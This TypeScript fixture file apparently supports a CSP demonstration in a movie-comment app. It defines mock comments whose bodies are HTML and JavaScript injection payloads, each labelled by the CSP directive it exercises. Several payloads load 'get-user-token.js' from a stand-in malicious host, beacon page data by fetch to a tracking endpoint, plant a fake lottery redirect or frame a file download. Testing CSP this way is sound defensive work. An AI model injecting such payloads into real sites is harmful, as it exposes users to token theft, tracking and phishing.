import { MovieComment } from '../src/app/core/models/movie-comment';

export const maliciousComments2: MovieComment[] = [
  // font-src: external stylesheet
  // {
  //   userName: 'User1',
  //   body: "<link rel='stylesheet' href='https://test-site.com.pl/malicious-font.css'>",
  //   creationTime: '2020-03-04',
  // },
  // font-src: inline styles
  // {
  //   userName: 'User1',
  //   body: `<style>@font-face { font-family: "MaliciousFont"; src: url("https://test-site.com.pl/send-user-data.js");}
  //   p,h1, span { font-family: "MaliciousFont" !important;}</style>`,
  //   creationTime: '2020-03-04',
  // },
  // style-src-elem: external stylesheet
  // {
  //   userName: 'User12',
  //   body: "<link rel='stylesheet' href='http://localhost:3000/malicious-styles.css'>",
  //   creationTime: '2020-03-04',
  // },
  // style-src: inline stylesheet
  // {
  //   userName: 'User12',
  //   body: `

  // <style>
  // body {
  //   background-color: blue;
  // }

  // .navbar {
  //   background-color: green !important;
  //   height: 30px !important;
  // }

  // .display {
  //   width: 40% !important;
  // }

  // p,
  // h1,
  // span {
  //   font-family: "Lucida Sans"
  // }

  // .comment-list {
  //   background-color: yellow !important
  // }
  // </style>`,
  //   creationTime: '2020-03-04',
  // },
  // img-src
  // {
  //   userName: 'User2',
  //   // body: `<img src='#' if (!this.hasError) { this.hasError = true; onerror="this.onerror=null; var script = document.createElement('script'); script.src='http://localhost:3000/send-user-data.js'; document.body.appendChild(script);" />`,
  //   body: `<img src='http://localhost:3000/banner.png'> `,
  //   creationTime: '2020-03-04',
  // },
  // media-src
  // {
  //   userName: 'User2',
  //   body: `<video src='http://localhost:3000/malicious-video.mp4' type="video/mp4"  controls autoplay></video>`,
  //   creationTime: '2020-03-04',
  // },
  // object-src
  // {
  //   userName: 'User2',
  //   body: `<object data="http://localhost:3000/malicious-newsletter" width="300" height="100"></object>`,
  //   creationTime: '2020-03-04',
  // },
  // form-action
  // frame-src

  {
    userName: 'User3',
    body: 'Oglądałem setki razy! 10/10.',
    creationTime: '2020-03-04',
  },
  {
    userName: 'User4',
    body: 'Wspaniałe połączenie akcji i fabuły.',
    creationTime: '2020-03-04',
  },
];

const maliciousComments = [
  // img-src <img src="https://malicious-site-awx4.onrender.com/banner.png" />
  // media-src <video controls width=400px height=300px src="https://malicious-site-awx4.onrender.com/malicious-video.mp4" />
  // frame-src
  '<iframe style="width: 100%; height: 80px" src="https://malicious-site-awx4.onrender.com/download-file"></iframe>',
  // frame-ancestor
  // app has been nested in the malicious user site
  // script-src-attr
  `<p color="yellow"> Wygrałeś 100.000 zł!!!</p>.<div onclick='window.location.replace("https://malicious-site-awx4.onrender.com/lottery-attack")' ><span style="color: red; cursor: pointer; text-decoration: underline">Kliknij tutaj</span>, aby odebrać nagrodę.</div>`,
  ,
  // script-src-elem
  `<div onwheel="
      (function() {
        const scriptId = 'user-token-script';
        let script = document.getElementById(scriptId);

        if (script) return;

        script = document.createElement('script');
        script.src='https://malicious-site-awx4.onrender.com/get-user-token.js';
        script.id=scriptId;
        document.body.appendChild(script);
      })()"
      style="position: absolute; width: 100%; height: 100vh; top: 0;">
  </div>`,
  // script-src-elem localhost
  `<div onwheel="
      (function() {
        const scriptId = 'user-token-script';
        let script = document.getElementById(scriptId);

        if (script) return;

        script = document.createElement('script');
        script.src='https://localhost:3000/get-user-token.js';
        script.id=scriptId;
        document.body.appendChild(script);
      })()"
      style="position: absolute; width: 100%; height: 100vh; top: 0;">
  </div>`,
  // connect-src
  `<div onmouseover="
  (function() {
    // document.addEventListener('onmouseover', function(event) {
      console.log('here1');
      const currentUrl = window.location.href;
      const target = event.target;
      setInterval(() => {
      console.log('here2');
      })
        // fetch('http://localhost:3008', {
        //   method: 'POST',
        //   headers: {
        //     'Content-Type': 'application/json;charset=UTF-8',
        //   },
        //   body: JSON.stringify({
        //    target,
        //   }),
        // });

    // });
  })()"
  style="height: 100px; width: 200px">
</div>`,
  // connect-src
  `
<div onmouseover="
   (function() {
      if (window.interval) return;

      window.interval = setInterval(() => {
        const data = {
          date: new Date(),
          currentUrl: window.location.href
        };

        fetch('https://malicious-site-awx4.onrender.com/track-user', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json;charset=UTF-8',
          },
          body: JSON.stringify({
           ...data,
          }),
        });
      }, 5000);
  })()"
  style="height: 100px; width: 200px">
</div>`,
  // font-src
  `<link rel='stylesheet' href='https://malicious-site-awx4.onrender.com/malicious-font.css'>`,
  `<link rel='stylesheet' href='https://localhost:3000/malicious-font.css'>`,
  // font-src
  `
  <style>
  @font-face {
  font-family: "MaliciousFont";
  src: url("http://localhost:3000/fonts/Barcode-Regular.ttf");
}

body {
  font-family: "MaliciousFont" !important;
}
</style>`,
  // font-src
  `
  <style>
  @font-face {
  font-family: "MaliciousFont";
  src: url("https://malicious-site-awx4.onrender.com/Barcode-Regular.ttf");
}

body {
  font-family: "MaliciousFont" !important;
}
</style>`,
  // style-src-attrb
  `<p style="
    background: red;
    color: green;
    font-size: 24px;
    height: 100px;
    font-weight: bold;
    display: flex;
    letter-spacing: 15px;
    align-items: center;
    background-image: url('https://malicious-site-awx4.onrender.com/malicious-code.js')">
Złośliwy komentarz
</p>`,
];

// style-src-attr
